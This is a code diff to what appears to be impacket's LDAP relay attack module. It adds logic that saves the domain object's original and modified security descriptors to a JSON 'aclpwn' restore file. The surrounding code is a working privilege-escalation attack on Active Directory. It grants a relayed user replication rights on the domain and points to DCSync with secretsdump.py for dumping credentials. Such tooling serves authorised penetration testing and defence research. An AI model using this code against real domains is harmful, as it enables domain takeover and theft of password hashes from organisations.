@@ -18,6 +18,11 @@
 import random
 import string
 import thread
+import json
+import datetime
+import binascii
+import codecs
+import re
 import ldapdomaindump
 import ldap3
 from impacket import LOG
@@ -128,6 +133,9 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('ACL attack already performed. Refusing to continue')
             return
 
+        # Dictionary for restore data
+        restoredata = {}
+
         # Query for the sid of our user
         self.client.search(userDn, '(objectCategory=user)', attributes=['sAMAccountName', 'objectSid'])
         entry = self.client.entries[0]
@@ -145,6 +153,10 @@ class LDAPAttack(ProtocolAttack):
         secDescData = entry['nTSecurityDescriptor'].raw_values[0]
         secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
 
+        # Save old SD for restore purposes
+        restoredata['old_sd'] = binascii.hexlify(secDescData).decode('utf-8')
+        restoredata['target_sid'] = usersid
+
         secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', usersid))
         secDesc['Dacl']['Data'].append(create_object_ace('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', usersid))
         dn = entry.entry_dn
@@ -152,12 +164,34 @@ class LDAPAttack(ProtocolAttack):
         self.client.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
         if self.client.result['result'] == 0:
             alreadyEscalated = True
-            LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain' % username)
+            LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain', username)
             LOG.info('Try using DCSync with secretsdump.py and this user :)')
+
+            # Query the SD again to see what AD made of it
+            self.client.search(domainDumper.root, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
+            entry = self.client.entries[0]
+            newSD = entry['nTSecurityDescriptor'].raw_values[0]
+            # Save this to restore the SD later on
+            restoredata['target_dn'] = dn
+            restoredata['new_sd'] = binascii.hexlify(newSD).decode('utf-8')
+            restoredata['success'] = True
+            self.writeRestoreData(restoredata, dn)
             return True
         else:
             LOG.error('Error when updating ACL: %s' % self.client.result)
             return False
+
+    def writeRestoreData(self, restoredata, domaindn):
+        output = {}
+        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+        output['config'] = {'server':self.client.server.host,'domain':domain}
+        output['history'] = [{'operation': 'add_domain_sync', 'data': restoredata, 'contextuser': self.username}]
+        now = datetime.datetime.now()
+        filename = 'aclpwn-%s.restore' % now.strftime("%Y%m%d-%H%M%S")
+        # Save the json to file
+        with codecs.open(filename, 'w', 'utf-8') as outfile:
+            json.dump(output, outfile)
+        LOG.info('Saved restore state to %s', filename)
 
     def validatePrivileges(self, uname, domainDumper):
         # Find the user's DN
